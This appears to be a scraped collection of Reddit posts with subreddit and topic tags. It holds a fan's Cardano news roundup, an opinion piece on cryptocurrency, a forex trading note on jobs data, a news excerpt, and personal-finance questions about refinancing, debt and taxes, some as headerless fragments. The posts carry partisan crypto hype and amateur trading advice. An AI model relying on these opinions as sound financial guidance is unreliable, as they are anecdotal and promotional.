58. Michael Peyton Jones and Manual Chakravarty (the architects of Plutus) talked about 1) the benefits of Cardano’s modern approach to designing Plutus TX and Plutus Core and how Plutus Core basically being lambda calculus allows for mathematical verification of software written in Plutus, 2) how UTXO (and EUTXO in Cardano) are much more battle proven than other ledger accounting systems like account balance system (e.g. ETH) which have had problems, 3) how non-fungible role tokens will be a thing, and 4) how they are now laying out a real development platform for builders instead of just throwing Plutus out into the world.
59. Lars Brünjes (Head of Education) laid out how they are going to train a group of developers through the Plutus Pioneers program.  That group will help test the Alonzo test net after it launches.
60. Lars has also cloned Uniswap in Plutus with a graphical user interface and completely automated price discovery in the liquidity pools.  He did this as a proof of concept to show the capabilities of Plutus. That was demoed right on the stream.
61. They then brought on people from three different Haskell development firms who will be building things on the testnet as a sort of “red team” test of Alonzo.  They all seemed to be very capable in terms of Haskell development (note here that Plutus is basically Haskell).
62. Tom Lindeman (Chief Security Officer at Runtime Verification) then laid out how disastrous the last few years in Ethereum have been for smart contract security.  But, Cardano has a solution.  IOHK and Runtime Verification will partner to certify smart contracts as to security.  Runtime Verification will do the security audits.  This program will be called “Alpha Frontier”.
63. Charles then laid out the details of the timeline for Alonzo as described above.   It sounds like they are targeting to be totally done and hit a code/feature freeze at the end of June.  But, it will take Coinbase, Kraken, Binance et al. at least four weeks to update their systems before they can actually launch smart contracts on mainnet.
64. Collin Edwards and Duncan Couts then gave us an update on the stake pool world as we approach “D DAy” or d=0 which is full decentralization of block production. A stake pool operator Shawn McMurdo has made some Cardano Improvement proposals as to 1) a non-linear curved basis for a0 (pronounced a-naught, represents stake pool operator pledge) to affect rewards more greatly, 2) non-centralized rankings in Daedalus, and 3) an adjustment to minimum fees from fixed to variable.   Collin and Duncan clarified there will be no changes to a0 (pledge) or k (max pool size) at the d=0 (full decentralization) event coming up. Duncan also laid out how they are going to launch P2P node testnet in early Q2.  This will allow for information to flow directly between nodes and will accomplish automation of things like peer discovery that are currently manual on the network.
65. Dor Garbash then gave an update on Catalyst.  As covered previously here, Catalyst has become a monster.  There are 17k people in Ideascale and the treasury is worth more than $400MM.  You heard that right, almost a half billion dollars in the Catalyst Treasury.  We also heard from a bunch of the previous catalyst winners.
66. Someone paid $23k for the notorious “Your telling the CEO of IOHK…” tweet.  [https://v.cent.co/tweet/1374769078519300097?s=u\_a](https://v.cent.co/tweet/1374769078519300097?s=u_a)
67. IOHK is rolling out a new team that will fight the scammers in crypto. In my mind this involves guys in polo shirts with popped collars and Ledger Nano Xs around their necks carrying [these](https://www.heckler-koch.com/en/products/military/submachine-guns/mp7a1/mp7a2/overview.html) and hunting the bad guys while ‘90s action movie music plays. Probably Dwayne Johnson is their commander. Maybe that’s not what Charles has in mind.  [https://twitter.com/IOHK\_Charles/status/1375473873651568640](https://twitter.com/IOHK_Charles/status/1375473873651568640)
68. Cardano is the Tesla of crypto. We’re just in that early stage right before the Model 3 launch where the Ford and GM guys are at peak fear/peak shit talking but we haven’t made that big move yet.  “It’s an illusion, they’ll never release a sub $40k car.”  We’ll see shortly, gentlemen...we’ll see.
69. Every once in a while I like to take stock of where the rest of the crypto space is on Cardano. So, let’s do a little review of what a few of the larger youtube crypto and other influencers are saying about Cardano right now.
70. The biggest crypto youtuber with 717k subscribers says “shame on you, Cardano community” for talking so badly about EIP 1559 (the latest Ethereum Improvement Proposal). Then in the same video he says he may tell people to sell their Ethereum for Cardano &amp; DOT if things don’t improve by the end of April (with a bunch of caveats). [https://www.youtube.com/watch?v=p1OdprEpHfU](https://www.youtube.com/watch?v=p1OdprEpHfU).
71. Another youtuber with 587k subscribers posted a video called “Why I'm Dumping Ethereum For This Coin” and said that ETH would have “massive problems” if Cardano hits its deadline for smart contracts on mainnet.  He’s actually recommending some other coins that aren’t ETH or Cardano, but made his lack of confidence in ETH in the face of Cardano’s challenge very clear if Cardano achieves its goals. [https://www.youtube.com/watch?v=5p8LgjMQbyE](https://www.youtube.com/watch?v=5p8LgjMQbyE)
72. Lark Davis (256k subscribers) released a video called “Don’t Buy Cardano” in which he lays out the devil’s advocate argument against Cardano and then responds to those arguments.  He finished by saying “I think that Cardano will prove the haters wrong this year…but...it will simply be a piece of the bigger picture of the cryptoverse.” [https://www.youtube.com/watch?v=J-bB8gzUCMo](https://www.youtube.com/watch?v=J-bB8gzUCMo)  This followed a video a few days ago that seemed to identify the delay of Ethereum’s layer 2 scaling solution as “probably the biggest crypto fail of 2021”.  [https://youtu.be/QCo5egQmiG8](https://youtu.be/QCo5egQmiG8)
73. That’s a collective 1.56 million subscribers.  Of course, some overlap there. But, that’s a lot of potential viewers. It seems like the message being delivered to them is a lot of playing both sides of the fence. From my view, this is what it looks like when you hit a tipping point and the herd starts slowly capitulating on a consensus position.
74. Charles says they are actually going to hire investigators for the IOG anti-scammer team.  People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon.  Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
75. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul.  Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds.   [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
76. We hit 100% decentralization of block production tomorrow.  Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
77. Charles has also announced that he will no longer go on podcasts that are primarily concerned with price and trading of cryptos (even if they are friends) as he feels it is irresponsible. Certain youtubers are gonna be sad about this. But, one can hope they realize that Cardano will always appreciate their steadfast support over the years. [https://www.youtube.com/watch?v=AGWZ2HBSI7E](https://www.youtube.com/watch?v=AGWZ2HBSI7E)
78. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days.  Enjoy it guys!!!
79. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
80. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
81. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem.  To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
82. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the  transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”.  When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase.  The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.

CryptoCurrency,The state of Crypto,"Let’s have an open chat about the current state of “Crypto” and how I view its current messed up and confusing state, at least in the eyes of the average Joe.
My view is more focused on what Crypto has actually evolved into, think DAPPS Vs the original Bitcoin blockchain. And what majority of us retail investors (noobs) seem to think what Crypto is, and how we are miss using it.
I will say in general the Reddit community is pretty good compared to other social media platforms such as Facebook groups where I see total noobs throw money at shitcoins having NFI what they are doing.

People are failing to understand that most crypto isn’t intended to be used as a currency. I believe this is probably due to the media spreading complete FUD on what blockchain is and how it’s evolved from what BTC blockchain is, or people simply think that  ALT coins are are simply competitors of/or the “next bitcoin”.

Not all crypto is a currency the same way you wouldn’t say that Apple or Tesla shares are currencies. Sure they have value, but you don’t start demanding that a store accepts Apple stock to trade for a new TV do you? This seems to be what a SCARY amount of people think with Crypto. And I think the fact that we keep calling it all CryptoCurrency is making it worse. Basically If not all blockchains are currencies, then we need to stop calling everything a Crypto currency.

Most crypto today are nothing more than shitcoins to be used to pump and dump by profiting off people that have no idea what they are buying. Harsh but true.
Why? Let me explain. 

Bitcoin, Litecoin, hell even Dogecoin are examples of crypto intended to be used  as digital money to replace fiat. Clearly BTC has turned into a store of value instead of what it was originally designed to be used for, but that’s besides the point. 

I keep hearing people say shit like “all these cryptos actually have no intrinsic value”. To me  thats a major misconception I’m finding with majority of people on crypto forums. 

Since USD is no longer gold backed, it no longer has any real intrinsic value. Since the federal reserve can just print 3 trillion out of thin air (they just did),  it’s really no different than Bitcoin being backed by nothing. Instead it’s backed by a Trust that something is worth yay much.

Anyhow, the points I really want to get across are:
Majority of crypto today is either a utility to be used for an actual use case via its DAPP or to pay for network fees on the native blockchain for its token use. 

People are turning these crypto’s into assets like a stock, because again, people have no NFI what they are doing and buying. But sure, there is clearly money to be made from this, at least for now… and then it’s going to absolutely wreck the newbies.

Some cryptos are used to raise money for a project via an ICO. All of these projects are to develop either a new blockchain tech or a utility token on an existing blockchain. You can think of these more like shares in a company as they are working on a project/product and you are buying in on that. So some Crypto does have value, they are not just based on thin air, but are backed by an actual technological product providing a solution. The same way a company makes a product or service to provide a solution or product.

This is why some TOKEN cryptos gets in massive shit with the SEC as they are acting like “stocks/shares” without filing the correct legal paperwork. If they did the correct paperwork these tokens would then be called “security tokens” which are in fact the crypto version of a stock. It gives the holder voting rights of the company and/or project direction that they are working on.

I know I said most cryptos are only good for pump and dump, but that’s because most are shitcoins with bullshit white papers pretending to solve problems that don’t exist (or that blockchain isn’t the correct solution) and simply won’t be around once the people behind the projects cash out their share of the initial coin offering (ICO) and leave you with a worthless chunk of binary. 

To clarify, that doesn’t mean that all cryptos have no intrinsic value. As some are actually tokens of value based on a real world projects solving a real problem or providing a service i.e. utility tokens. Though that’s where this issue of “they are like a stock but not really” grey area comes in, in regards to both the legal side and then the miss use in which people are trading them like stocks on exchanges. And then you have people buying utility tokens and treating them as an investment/stock when they shouldn’t be used as such. I say this EXPECTING you to have an UNDERSTANDING of the blockchains architecture and what each coin/token is intended for based on the blockchains protocol. For example, There’s Theta and TFuel (same blockchain, two distinct uses). Or VeChain with VET and VTHO, which significantly helps separate the cost of using blockchain from market speculation, again same blockchain with two tokens for seperate uses. If you are just buying these willy nilly without doing your research, then imo, you deserve to lose your money.

I’d say the vast majority of people on here, don’t realise/understand  most of this, and it scares me.
Hence the market is insanely volatile and filled with shitcoins. Basically scammers screwing over noobs.
What will happen once the bear market comes into play, is that a shitload of people are going to lose a shitload of money, then there will be bad press all over the shot with the governments and financial institutions pushing shit out to the media about how bad Crypto is.

I’ll do a follow up post later on what blockchain technology I believe we need to be investing in. I prefer to use the term blockchain over the term Cryptocurrency as stated above.

In the mean time, I’d love to hear your thoughts and views, am I wrong? Have I misunderstood what Cryptos are and their use cases? Am I just sour that I didn’t buy 1k of bitcoin back in 2009? 😉

Share your views with me.

TL:DR
Majority of people have NFI what crypto is and are gonna get wrecked. Most crypto is NOT a currency to replace fiat. Market is filled with bullshit projects. There’s different types of Blockchain tech, invest in it according.

Sure you can say crypto currency coins designed to replace fiat have no intrinsic value e.g. BTC, LTC, but neither does fiat as it’s no longer gold backed as is based on fairy dusk.",cryptocurrency

Forex,"United States Non-Farm Employment Change April 2, 2021","What does the data mean to the market?

&amp;#x200B;

The headline data of Non-Farm Payrolls (NFP) reflects the change in the number of people employed during the previous month. A higher number of people employed is good for the USD and would create a buy on USDJPY. Vice versa, a lower number would be bad for the USD and would generate a sell on USDJPY. NFP comes out with six lines of data which makes this report far more complex. The other two significant lines of data I watch are the Unemployment Rate and Average Earnings. The Unemployment Rate, a lower number, is good for the USD and would create a buy on USDJPY. A higher number would be bad and create a sell. I am looking for these two numbers not to conflict with the headline NFP number. Average Earnings a higher number is good a lower number is bad, again this must be onside and not conflict with the headline NFP.

Historic Deviations and Their Outcome

&amp;#x200B;

March 5 2021 - +197k positive deviation with no conflicts. The move was great on USDPYJ! I don't trade stocks, but for those that do, look how they reacted, which was the opposite of the USD value. Better employment numbers suggest a tightening of monetary policy, which is not good for the stock market!

&amp;#x200B;

Today If we see a 150k deviations in either direction from Non-Farm Payrolls without any conflicts from Unemployment and no significant conflict from Average Earnings, we can expect an excellent move.

stocks,Job growth booms in March at highest level since August,"https://www.cnbc.com/2021/04/02/us-jobs-report-march-2021.html


Job growth boomed in March at the fastest pace since last summer as stronger economic growth and an aggressive vaccination effort pushed companies to step up hiring, the Labor Department reported Friday.

Nonfarm payrolls increased by 916,000 for the month while the unemployment rate fell to 6%.

Economists surveyed by Dow Jones had been looking for an increase of 675,000 and an unemployment rate of 6%.

The report comes amid a slew of other indicators pointing to stronger growth as the U.S. tries to shake off the effects of the Covid-19 pandemic. States and municipalities across the country continue to reopen after a year of operating at reduced capacity.

Business activity has returned to close to normal levels in much of the company despite the restrictions, with a tracker by Jeffries indicating that activity is at 93.5% of its pre-pandemic level.

Data from Homebase shows that employees working and hours worked both gained sharply over the past month, with significant improvements in both hospitality and entertainment. Those have been the hardest-hit sectors, but have improved over the past two months as governments have loosened up on some of the harshest restrictions on activity.

At the same time, manufacturing is enjoying a boom, with an Institute for Supply Management gauge of activity in the sector hitting its highest level since late 1983 in March.

The pace of gains combined with the unprecedented level of government stimulus has kindled worries about inflation, though Federal Reserve officials say any increases will be temporary.

The Fed is keeping a close eye on the jobs data, but policymakers have said repeatedly that even with the recent improvements the labor market is nowhere near a point that would push the central bank into raising interest rates.",finance

Last year my return took basically 6 months to come. Filed on 2/1 didn’t receive it until sometime in August.

Last year when I called they said my return had been randomly selected for a more thorough going through. (EITC related) (side note: our newborn twins sons Ss #s leaked the year before in that huge data leak with one of the credit reporting agency’s). I was sent the same letter over and over resetting the clock. luckily (🙄) I had gone to H&amp;R for the cash advance due to the shutdown.

This year H&amp;R changed banks and I did not qualify for the maximum allotted cash advance, instead it was one of the lowest.

By this time last year I had already received the letter telling me I had to wait an additional 60 days. This year I have received nothing. No letter, no update.

Yesterday the dialogue changed to include this: 

“Please read the following information related to your tax situation:
Tax Topic 152, Refund Information”

Is anyone else having these issues this year? I see a lot of similar stories from last year as well.

Please advise; last year I called and I’m fairly certain calling prompted the letter as the first one was dates right after my call.

personalfinance,Bank of America is offering me a 5-year program to pay off my ~$5k in credit card debt.

The card has a 24% interest rate. The program they're offering me would bring me to 90 dollar payments every month for the next 5 years with a 2.3% (I think, somewhere around there) interest rate -- I make between 900-1200 dollars a month. I've asked them if I could qualify for anything cheaper per month but they said no. Though they also mentioned that soon I will be reaching a certain ""threshold"" they want to avoid, so they're pushing me to apply for this program now. Dunno if that's good or bad. Like, is it potentially the threshold at which I can qualify for something cheaper?  


I asked them if I could have a copy of the forms this program includes, but basically suggested it was very basic and didn't even have a form??? It sounds whack, and I can't find search results related to it. I asked them what would happen if I, for example, missed a payment -- they basically said as long as I pay off the total amount within the 5 years, I'm good.

personalfinance,"Refinancing mortgage, closing keeps getting pushed back","This may be more a r/legaladvice question, but let’s continue anyway.

I’m trying to conceal identity as much as possible, so sorry in advance for being non-descriptive. I started my refinancing process in January 2021. We locked a good rate, &lt;2% on a 15y mortgage. Our current mortgage is near 4% and we’ve been in the home for 3 years. 

Calculating this out, the refinance makes sense in the short term (we can do lower payments if needed), and long term (plan to pay at our current rate and put the additional payments towards principal, which ultimately saves us around $10k in the long run and we finish paying off the loan in roughly 8 years).

In our credit history is a second loan with a lien against our home. Mortgage company somehow missed this. (??!!??). They didn’t let me know until the end of February that we need to either subordinate or pay it off. We decided to pay it off as the rate wasn’t that good and we had the funds to do so. The catch is, our rate was only good through late March. 

So… timeline:
Late January - rate was locked
Late February - notified of subordination or pay-off options
Late March -  rate lock expires

As soon as we were notified of the need for subordination or pay-off, I moved funds around, got a pay-off quote, and paid it off with PDF statement stating we have a $0 balance by mid/late March. 

However, this isn’t good enough. We need an official filing, which takes up to 30 days and gets snail-mailed to me, and then I’ll likely have to FedEx next-day the document to them. 

It seems oddly convenient that the refinancing company missed this when we started this process in January when I unlocked our credit history, they let us know one month out from our rate expiration, and that the official filing is known to take 30 days. 

Obviously to get this far, we have over $1k in this process. The refinancing company is giving us the option to extend our rate day-by-day for a fee (roughly $50/day). I’m kind of getting frustrated at this point because this was their original mistake of missing this in our credit history and I’ve been very transparent to them the entire time. The $1k is non-refundable. I just see this as a way of them not wanting to let us keep this rate by pushing out our closing and costing me more money for really no good reason. 

Do I have any recourse? I’d still like to continue refinancing, but at this rate, the extensions are adding another $750 to our closing if we get the document around the time I think we will.

Update: They had the purchase agreement of our second loan on file the day after our rate was locked.",finance

I make $36000 gross after benefits and taxes and pre-tax deductions, I take home almost exactly 2000 every month. I have a number of smaller debts that the charge-offs will fall off my records in the next year and bigger ones going for 2ish more years.

I know I won't be able to rely on my parents, they're catching up but it's a long road. Would it benefit my score to attempt to pay anything off or is Bankruptcy, Chapter 7 a good option?

I'm currently at a 4.74% interest rate with 48 months left and am trying to get down in the 2% range, but I also want to extend out the loan to free up the extra cash each month.

I spoke with an auto refi lender and he explained that he can offer a good 2.49% loan with a 63-month term, which is right in the ballpark of what I was aiming for, but he also recommended an 84-month term at 3.49%. This is when it got confusing. He tried to explain that I would end up saving more and could effectively get the rate down to 1.99%. He mentioned something about simple interest, but I'm not seeing how this doesn't end up with me paying more over the term of the loan. This sounded like a fast-talk pitch to get me to agree to a higher interest rate when I was shooting for something at least 1% lower. It's possible I might have misunderstood or am missing something important from the conversation, but that was the gist of it. 

Can someone explain how this makes sense, or does it make no sense at all?

I should add that I'm not concerned with saving as much as possible over the term of the loan. My main goal is freeing up the cash month-to-month without ending up paying more over the term. I'm fine if I end up paying the same amount in interest as I would have on the original loan as long as it isn't *more.*

personalfinance,I am fighting myself on what to do until retirement. 2 ROTHs or keep my cycle going?,"I am 18 years old and currently manage a Roth IRA I just started, and a “general investing” account with betterment. I want to get into a steady groove on putting money into these accounts but the problem arises when I think taxes. I know Roth’s are tax exempt so I am not worried about it, however my betterment account is a taxable account. I am not planning to touch the money I put into this “general investing” account for 10-20 years, I thought of just opening a traditional savings and just adding to that but the interest rate of return is a fraction of what I would get with betterment. My question is, will the compound interest accumulated in adding to a taxable account for 10-20 years be worth it just for 30-40% of it to be taken when I go to withdraw the money? Or I am I better off just opening a savings or a second Roth and having it in a TDF or a pre set portfolio? 

Ps. I have an emergency fund already going with enough for 6 months of expenses so I am set with that. Thank you for your time in reading my post.",finance

personalfinance,Refinance to HELOC or stick it out?,"Preface: I'm not looking for a ""should I pay off the mortgage"" debate; it makes my wife feel more secure to eliminate the debt, so any opportunity cost is an investment in marital happiness.  Paying the minimum on the mortgage and investing everything else ASAP is not on the table right now.  (Investing what currently goes to the mortgage is the plan once it's eliminated, naturally!)

\-----------------------

We just made a large principal payment on our mortgage, to the point that our outstanding balance is now less than the amount of cash we often have floating around in our accounts.  (Emergency fund, saving up for a large expense later this year, property taxes, etc.)  Assuming that we continue to funnel our extra money into paying down the mortgage, I expect to eliminate it entirely in the next year or two.

What I'm wondering is whether it would be worthwhile / prudent to refinance with a HELOC for this final portion.  On the one hand, the HELOC would clearly have a higher interest rate than our current mortgage (4.00% vs. 2.875%, at a quick glance), and interest would mostly not be tax-deductible, which widens that gap.  However, if we put our cash on hand to keeping the HELOC balance minimal, it's possible that we'd pay very little interest before the remaining balance is taken care of.

Doing that would make the assumption that when the expenses we've currently saved up for come due, we would just draw on the HELOC as needed, paying it back down again later.  I'm not terribly concerned about having the discipline to do so -- we've been using r/ynab for around a decade, so we stick to the budget pretty solidly.

What I'm more concerned about is the possibility that in an emergency, the HELOC limit might get cut sharply or otherwise leave us unable to pull the money back out.  Of course, we're only talking about a year of working in that way; odds seem low, but the impact would be unpleasant.

What have other folks done at the tail end of their mortgage?  Ride it to the end, refinance to a HELOC, or something else?",finance
personalfinance,How Do I Optimize my Finances While Trying to Become a Homeowner?,"Hello, I am a 26-year-old currently looking to take the next step with my partner by finding a home where we can live together in the Southern California area. 

We now currently have $150,000 dollars between the two of us, and I know this would be more than enough for a down payment, but I want to know what is the best way to do this financially, so we can optimize our finances and work towards a larger home within another span of 5 years.

I have a master's degree in English and have been seeking employment as an adjunct professor at community colleges in Southern California, but, due to Co-vid, there has been a massive hiring freeze. So unable to find work, I have been developing my curriculum, doing food delivery, and working on personal projects. I get by from the support of my family, but I'm not bringing in any consistent pay. When I do find work, I can probably expect $80,000- $110,000 based on how many classes I can get.

My significant other makes 55,000 a year in income.

The reason we have such a large nest egg is because I looked into stock investment when the market dived due to co-vid and, not having anything to do with my time, I read Warren Buffet and found companies that were bleeding badly but had significant chances of recovering. I discussed my findings with my significant other, and she agreed to put her saving into these companies. I put as much as I could in myself and luckily, things worked out. We still currently have our assets invested.

We are looking for a 2-bedroom home with a 2-car garage. Most places seem to cost around $300,000-S400,000 since it is So-Cal and apparently we're in a ""buyer's market.""

With all that said, I just don't know what would be the best step to maximize the potential of our finances. I would like to continue investing in companies that have shown exceptional competitive advantages, so I can do the most for us financially, but what is the best way to do that? 

If we do buy a place, do we go with a first-time home-buyer loan and put the smallest down payment that we can, so a significant portion of our funds can be invested, or do we put down a full 20% to get the best rates? Should we just rent? Should I wait until I can find employment as an adjunct before committing to purchasing anything? If we wait, is there a significant risk of the housing market and loan rates going through the roof?  These are all questions I’m wrestling with.

We intend to hold these stocks for a least five years, so I have confidence they will go up and likely beat the higher interest rates if things go on, but I'd really like to hear other's opinions to make sure I'm making the best decision and not doing something stupid.

We aren't necessarily uncomfortable with our living circumstances but are tired of living off of family and want to spend more time together. We can wait if it's by far the best option but want to know what our next steps should be when we do make the leap.

In regard to my significant other, we are very open and have every intention of spending the rest of our lives together. She places a lot of faith in my financial decisions, especially after the stocks we invested in have seen such tremendous growth, but that makes me all the more aware of how careful I need to be!

personalfinance,Installment loan issue,"Wondering if anyone has any pointers. In 2019 I opened an installment loan for $2500. My interest is about $6000 more so I’m paying close to $10G on this thing. I set up auto payments every 2 weeks to pay a tiny bit more than my minimum and at some point the company started randomly charging my account on Mondays and on off-pay weeks. I didn’t catch it because I assumed it was all being taken out on my actual scheduled dates but the whole time it was just being rejected because Mondays are not my best bank days. I was never contacted about it and when I finally called to inquire about my current balance, they told me that I was missing payments and that caused my balance to sky rocket because of daily interest rates. They had no answer to why I was not contacted about missing payments.  I’ve paid on time since then, over $500 and I checked my valence again today and they are telling me that I have technically only paid about $100 since I was late on those payments. They don’t report to the credit bureaus and are not giving me an option to refinance. At this point I still owe $2272. Is there anything I can do regarding those late payments? Apparently the store that I did all this with was closed and they have no option to go online to see the account. I know that I should have kept a better eye on my finances but again, I thought it was going as planned as it always was since I was never contacted about it and at this point I don’t k ow how this is ever going to get paid off with these daily interest rates.

personalfinance,Help with what is the most efficient debt repayment method. Modified Avalanche?,"Hi, a quick question about paying off student loans.
I have student loans ranging from 6%-7.6% interest rate. My goal is to pay off my loans as soon as possible with as little interest as possible. I make a decent salary and I'm pretty disciplined with my budgeting so I know I'll be able to pay off my loans in less than 10 years, I just want to do it as efficiently as possible. 

I understand that the avalanche method is supposed to save you money over time by tackling the highest interest loan first, but I am having a hard time grasping something. In my mind, it makes more sense to pay off the loan that is costing the most in interest each month.

Hypothetical Example:
Loan A: $10,000 at 7.6% 
Loan B: $20,000 at 6.08%
The  monthly interest for A is $760 and the monthly interest for B is $1,216 (Obviously this would change each month but you get the point).

The avalanche method would say to pay off A first, but in my head it makes more sense to start paying B first since it is costing me more interest each month at the moment. And then if I get the balance of B low enough where the monthly interest of A is higher, then I'd direct my payments to A.

Does this make sense? I have an excel sheet that calculates what the interest would be each month after my minimum payments so I would know each month which loan is costing the most in interest and then I'd direct my excess payment into that one. I've played around with repayment calculators that haven't been much help either. Any helpful input is appreciated :)",finance

1. Refer to my monthly statements from my brokerage account and look for the amount shown in “Net Gain/Loss” (realized gains and losses from sales). Calculate the total for Q1.

2. Run this number by a tax calculator. I’m using one found at Smartasset. It gives me a break-down of owes tax by the federal and state/local level (NY). Use those estimates for Steps 3 and 4.

CryptoCurrency,The Governance of the CBDC System by Andrea Civelli of Algorand.,"From the blog post, kinda too long to read:

Moreover, the entire supply of tokens is generated during the instantiation period of the CBDC and locked in a vault under the sole control of the Central Bank, which can issue and recall tokens from circulation in function of its monetary policy decisions. As such, the Algorand CBDC model is neutral to the monetary policy stance of the central bank. 

Finally, building a CBDC system on a private, permissioned instance of the public Algorand blockchain ensures Central Banks would be able to independently choose all the aspects of the governance of their CBDC network, setting roles and rules for service providers and end-users who want to take part in the CBDC system.

Tremendous read for all those who are interested in the CBDC.

personalfinance,Question about leaving Bank of America,"Tldr: switching to a credit union but planning on traveling.  Also have a decade of history with BoA and not looking forward to downloading all my old bank statements for my records. 

---

I have heard a lot of bad things about Bank of America. And after looking up other banks, it makes sense to switch to a bank that doesn't charge a maintenance fee on a checking account. 

So I opened an account with a local credit union.  But now I'm getting cold feet about closing my Bank of America account.  

I have been using Bank of America for about 12 years.  That's a long history of banking with them. They have all my monthly statements on my account page on their website.  Should I download all my statements? That seems like a lot - it's about 120 monthly statements.  But I'd rather keep records of all my banking history.  

I also am going to be traveling constantly with my new job. So I'm a little nervous about switching to a credit union right before starting to travel.  But from what I understand, you can use any co-op branch and atm without any fees. So it's comparable to Bank of America's nationwide atm's. 

I think those are the only hang ups I have. It *is* nice having the nationwide atm's available.  But they charged me about $100 in maintenance fees this past 12 months. I don't blame them, it's their policy, I'm not surprised about it. But it does seem like switching to a free checking account is the prudent thing to do. 

I'm also planning on getting a money market account in the near future.  But I'm going to do that once I have some money saved up.  And I'll also probably wait until covid is a thing of the past.  That way interest rates will be stabilized and it can be easier to find accounts with the highest rates.",finance

personalfinance,Parents assisting with gift vs family loan for cash offer for home purchase (US),"Hi all. Seeking advice if anyone has a chance to deep dive into my situation...

We were putting offers in on homes and had 20% for a down payment and pre-approval letter and continued to get heartbroken over and over and over again by cash offers beating us out. Eventually one came on the market that we really didn't want to lose and so parents (we're extremely lucky in this) stepped in and offered to ""be the bank"" and give us the money to make a cash offer. And our offer was accepted!

I have wired the deposit and I'm trying settle the best way to do this from here. The main goals are closing the home purchase obviously, and then getting a loan to pay off the loan from my parents. This second loan with the bank doesn't have to happen right away but I would like it to happen sooner rather than later to involve my parents for the least amount of time I can (they financially can do it but I hate that I even had to do this). I also want to get a loan at good interest rates with a bank before they rise.

I have spoken to my tax accountant and she mentioned making it a gift my parents give and do the tax form to take the total off the ""lifetime gift"" amount they have to avoid the taxes on the gift. If that is done, and I repay back after securing a loan on the property will I be then ""gifting"" back? and that total goes of my lifetime gift amount (I think it's 11.4M or something lifetime)? But under that way would I be doing a home equity loan rather than a refinance when I approach a bank?

The other option was having my parents do a loan to me and we sign and notarize a loan note. And then when I get a loan on the house after closing I would essentially be refinancing my loan to a new bank to replay the loan from my parents. (I understand there is no guarantee how much the loan will be for. As I said I have 20% of my own going in already). Does that type of loan refi from a family loan happen? 

Does anyone have advice on these two methods. Gift vs Loan? We are leaning in the parental loan direction now but not sure how this might affect when I try to get a refinance.... good or bad. We know the transfer of funds will show up as any bank looks into it so we're not trying to hide the fact that we are doing it this way or anything... just trying to figure out the best way for us to do it.

3. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience.  Here are some of the resources I've used: [https://haskellbook.com/](https://haskellbook.com/) [http://learnyouahaskell.com/chapters](http://learnyouahaskell.com/chapters) [Derek Banas Youtube Haskell Tutorial ](https://www.youtube.com/watch?v=02_H3LjqMr8)

Recently covered (complete list at [www.armyofspies.net](https://www.armyofspies.net)):

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia.

9. There is a Part 2 to the IOHK EUTXO discussion we reported under item 39.  Good read for verbally upstaging your ETH &amp; BTC supporting co-workers. Be the king of the post-zoom call crypto banter! [https://iohk.io/en/blog/posts/2021/03/12/cardanos-extended-utxo-accounting-model-part-2/](https://iohk.io/en/blog/posts/2021/03/12/cardanos-extended-utxo-accounting-model-part-2/)
10. Commenter Report:  the “metamask of Cardano” speculated about previously in item 30 is the “Yoroi dApp connector”.  It’ll be rolled out “with Ergo first and Cardano once Plutus is released.” [https://github.com/Emurgo/yoroi-ergo-connector](https://github.com/Emurgo/yoroi-ergo-connector)
11. It looks like this Yoroi dApp Connector info has even been detailed by Sebastien and Rob on yt. Not sure if we can link directly to this video. But, here is the link to the link. Looks like the dApp Connector talk starts at 1:23:10.  [https://twitter.com/NicoArqueros/status/1353203943195734017](https://twitter.com/NicoArqueros/status/1353203943195734017)
12. The visionaries among us are already thinking about advanced NFT derivative instruments (some even created by AI) in our ecosystem. [https://twitter.com/NicoArqueros/status/1370150347113648132](https://twitter.com/NicoArqueros/status/1370150347113648132)
13. Today is staking rewards day for Epoch 253!  Let’s get those duckets!
14. Cardano is getting a disproportionate cut of the attention market compared to its CMC neighbors. [https://twitter.com/CardanoRise/status/1371431289895665665](https://twitter.com/CardanoRise/status/1371431289895665665)
15. “Ask the Doctor” is switching from ERC-20 to Cardano. Note that Ask the Doctor is linked to FD7 Ventures in Item 7 below. [https://www.businesswire.com/news/home/20210315005744/en/Global-Healthcare-Platform-Ask-The-Doctor-to-Use-Cardano-for-World](https://www.businesswire.com/news/home/20210315005744/en/Global-Healthcare-Platform-Ask-The-Doctor-to-Use-Cardano-for-World)
